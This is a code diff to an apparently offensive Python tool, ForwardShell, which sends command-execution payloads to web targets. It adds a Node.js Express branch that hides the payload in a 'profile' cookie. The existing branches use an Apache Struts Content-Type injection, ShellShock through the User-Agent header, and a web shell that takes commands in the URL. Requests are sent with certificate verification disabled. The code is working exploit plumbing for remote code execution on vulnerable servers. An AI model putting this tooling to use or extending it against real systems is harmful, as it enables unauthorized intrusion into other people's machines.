@@ -96,12 +96,19 @@ class ForwardShell:
 		if payloadName == 'ApacheStruts':
 			payload = genPayload(cmd)
 			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
+			cookies = {}
+		elif payloadName == 'NodejsExpress':
+			payload = genPayload(cmd)
+			headers = {'User-Agent': 'Mozilla/5.0'}
+			cookies = {'profile': payload}
 		elif payloadName == 'ShellShock':
 			payload = genPayload(cmd)
 			headers = {'User-Agent': payload}
+			cookies = {}
 		elif payloadName == 'WebShell':
 			url += cmd
 			headers = {'User-Agent': 'Mozilla/5.0'}
+			cookies = {}
 
 		while True:
 			page = b''
@@ -109,6 +116,7 @@ class ForwardShell:
 				with requests.get(
 					url,
 					headers=headers,
+					cookies=cookies,
 					proxies=proxy,
 					timeout=timeout,
 					verify=False,
